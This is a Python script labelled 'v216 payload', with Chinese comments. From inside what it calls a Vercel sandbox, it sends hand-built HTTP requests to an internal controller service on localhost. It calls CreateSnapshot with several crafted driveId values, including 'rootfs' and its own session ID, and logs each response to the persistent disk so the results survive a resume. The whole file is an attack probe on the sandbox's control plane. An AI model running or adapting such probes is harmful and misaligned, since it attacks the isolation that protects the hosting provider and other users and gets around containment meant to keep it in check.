# -*- coding: utf-8 -*-
"""v216 payload: 精确确定哪个 driveId 变体触发快照
每个变体: 写 before 标记 + 请求 + 写 resp 落盘 (/vercel/sandbox 持久盘, resume 后可读)
"""
import socket, time, json, sys

SID = sys.argv[1] if len(sys.argv) > 1 else 'unknown'

def wlog(name, content):
    try:
        open('/vercel/sandbox/v216_%s' % name, 'w').write(content)
    except Exception:
        pass
    print('[%.1f] %s %s' % (time.time(), name, content[:300]), flush=True)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

def post(port, path, body, t=8):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

variants = [
    ('empty', ''),
    ('nonexistent', 'nonexistent-zzz-216'),
    ('rootfs', 'rootfs'),
    ('selfsid', SID),
]
wlog('start', 'sid=%s' % SID)
for name, did in variants:
    wlog('%s_before' % name, 't=%d did=%r' % (time.time(), did))
    try:
        st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
                       {'driveId': did, 'bucketBaseUrl': 's3://v1.vercel.com/snap/x'}, t=6)
        wlog('%s_resp' % name, '%s %r' % (st, pay[:800]))
    except Exception as e:
        wlog('%s_resp' % name, 'EXC %r' % e)
    time.sleep(1.5)
wlog('done', 'ALL VARIANTS SENT')
